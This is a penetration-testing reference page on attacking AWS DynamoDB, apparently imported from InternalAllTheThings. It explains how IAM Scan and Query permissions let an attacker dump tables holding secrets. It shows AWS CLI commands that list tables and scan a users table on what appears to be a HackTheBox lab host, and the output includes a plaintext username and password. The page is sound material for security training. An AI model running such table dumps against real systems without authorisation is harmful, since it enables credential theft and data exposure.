---
title: AWS - Service - DynamoDB
type: technique
tags: [aws, cloud, database, dynamodb, exploitation, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# AWS - Service - DynamoDB

## What it is

> Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.

## How it works

DynamoDB is a fully managed NoSQL key-value store; attackers with `dynamodb:Scan` or `dynamodb:Query` IAM permissions can dump entire tables, which often contain application secrets, user credentials, session tokens, or PII. Tables are frequently used as configuration stores for serverless applications, making them high-value targets for credential harvesting. Misconfigured resource policies or overly permissive IAM roles that grant all DynamoDB actions are the primary attack surface.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.

## List Tables

```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables        

{
    "TableNames": [
        "users"
    ]
}
```

## Enumerate Table Content

```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]'

{
  "password": {
    "S": "Management@#1@#"
  },
  "username": {
    "S": "Mgmt"
  }
}
```

## References

* [Amazon DynamoDB Documentation - AWS](https://docs.aws.amazon.com/dynamodb/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
